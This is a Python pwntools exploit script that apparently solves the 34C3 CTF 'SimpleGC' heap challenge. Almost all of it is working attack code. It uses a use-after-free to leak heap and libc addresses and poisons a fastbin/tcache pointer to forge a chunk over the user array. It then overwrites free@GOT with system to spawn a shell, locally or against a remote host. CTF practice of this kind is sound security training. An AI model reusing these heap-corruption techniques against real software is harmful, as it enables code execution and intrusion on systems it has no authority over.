#!/usr/bin/env python

'''
1.  allocate enough users/groups to fill tcache bin and start using fastbin
2.  create 2 different groups w/same name by editing a user's group and propogating change
3.  fill tcache bins and put chunks in fastbin by deleting users
3.1 delete user in one of groups in step 2. to create UAF scenario
4.  leak heap using UAF from step 3.1
5.  overwrite fastchunk FD ptr using UAF from step 3.1 and point it to userArr-0x10
6.  perform 4 rds of 2x chunk allocations to empty tcache bin + move fastbin into tcache bin
7.  overwrite userArr with forged groupName chunk
8.  leak libc by printing user 1's groupName
9.  overwrite free@GOT w/system by editing user 1's groupName
10. delete user 1
'''

from pwn import *
import sys  

def addUser(name, group, age):
    print(r.recv())
    r.sendline("0")
    r.sendlineafter("name:", name)
    r.sendlineafter("group:", group)
    r.sendlineafter("age:", str(age))

def displayGroup(groupName):
    r.sendlineafter("Action: ", "1")
    r.sendlineafter("name:", groupName)

def displayUser(idx):
    r.sendlineafter("Action: ", "2")
    r.sendlineafter("index:", str(idx))
    return r.recvuntil("0:")

def editGroup(idx, propogate, groupName):
    r.sendlineafter("Action: ", "3")
    r.sendlineafter("index:", str(idx))
    r.sendlineafter("(y/n):", propogate)
    r.sendlineafter("name:", groupName)

def deleteUser(idx):
    r.sendlineafter("Action: ", "4")
    r.sendlineafter("index:", str(idx))

def exploit(r):
    userArr = 0x6020e0
    free_got = 0x602018
   
    for i in range(9):
        addUser("A", "B"*i, 0)
    
    # associate users 7 + 8 w/ 2 different groups that have same groupName
    editGroup(7,"y","B"*8)

    # create UAF scenario
    # fill t2's tcache_bin 
    # start placing groupName chunks in main_arena.fastbinsY
    for i in range(8): 
        deleteUser(i) 
    
    sleep(1) # give t2 time to free last group before proceeding
 
    heap_base = u32(displayUser(8)[24:27].ljust(4,'\0'))-0x710    
    log.success("heap_base at: "+hex(heap_base))

    editGroup(8,"y",p64(userArr-0x10)) # fastbin attack target
   
    # alloc 8 chunks
    # place userArr @  head of tcache_bin
    editGroup(8,"n","round1")
    editGroup(8,"n","round2") 
    editGroup(8,"n","round3")
    editGroup(8,"n","round4") # alloc 1 chunk out of tcache, 1 chunk out of fastbin, copy rest of fastbin into tcache

    # fake groupName
    payload  = "/bin/sh\0"
    payload += p64(userArr)
    payload += p64(free_got)
    editGroup(8,"n",payload) 
    
    libc_base = u64(displayUser(1)[30:36].ljust(8,'\0'))-0x8f390 
    system = libc_base+0x47dc0
    log.success("libc_base at: "+hex(libc_base))
    log.success("system@libc at: "+hex(system))
 
    editGroup(1,"y",p64(system)) # overwrite free@got w/system
   
    deleteUser(1) 
    
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        gdb.attach(r)
        exploit(r)
    else:
        r = process(['./sgc'], env={"LD_PRELOAD":"./sgc_libc-2.26.so"})
        #r = process(['/home/vagrant/CTFs/34c3ctf/SimpleGC/sgc'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
